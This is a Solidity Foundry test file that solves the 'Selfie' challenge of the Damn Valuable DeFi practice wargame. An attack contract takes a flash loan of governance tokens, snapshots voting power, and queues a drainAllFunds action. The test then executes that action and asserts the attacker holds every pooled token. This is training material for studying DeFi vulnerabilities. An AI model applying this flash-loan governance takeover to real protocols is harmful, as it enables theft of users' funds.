// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract SelfieAttack {
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address internal owner;

    constructor(
        SimpleGovernance _simpleGovernance,
        SelfiePool _selfiePool,
        DamnValuableTokenSnapshot _dvtSnapshot
    ) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvtSnapshot = _dvtSnapshot;
        owner = msg.sender;
    }

    function flashLoan(uint256 _borrowAmount) public {
        selfiePool.flashLoan(_borrowAmount);
    }

    function receiveTokens(address _token, uint256 _borrowAmount) external {
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        dvtSnapshot.snapshot();
        simpleGovernance.queueAction(address(selfiePool), data, 0);
        dvtSnapshot.transfer(address(selfiePool), _borrowAmount);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        SelfieAttack selfieAttack = new SelfieAttack(
            simpleGovernance,
            selfiePool,
            dvtSnapshot
        );
        selfieAttack.flashLoan(TOKENS_IN_POOL);
        vm.warp(block.timestamp + 2 days);
        simpleGovernance.executeAction(1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
